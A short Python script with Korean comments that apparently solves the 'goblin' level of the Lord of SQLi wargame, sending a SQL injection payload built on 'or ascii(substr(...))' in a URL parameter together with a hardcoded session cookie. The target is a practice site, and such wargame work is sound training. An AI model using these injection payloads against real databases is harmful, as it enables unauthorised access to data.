# -*- coding : UTF-8 -*-
from requests import get

url = "http://los.eagle-jump.org/goblin_5559aacf2617d21ebb6efe907b7dded8.php"
#MySQL의 substr() 함수를 이용하여 문제를 풉니다.
param = "?no=0%20or%20ascii(substr(id,1,1))=97"

new_url = url + param

#쿠리를 설정합니다. 반드시 당신의 쿠키로 설정해주세요.
cookie = dict(PHPSESSID="5u71g5vp7547tv8ffl7osl0fl5")


r = get(new_url, cookies=cookie)
if r.text.find("<h2>GOBLIN Clear!</h2>") > 0:
    print("축하합니다! Goblin을 클리어했습니다!")
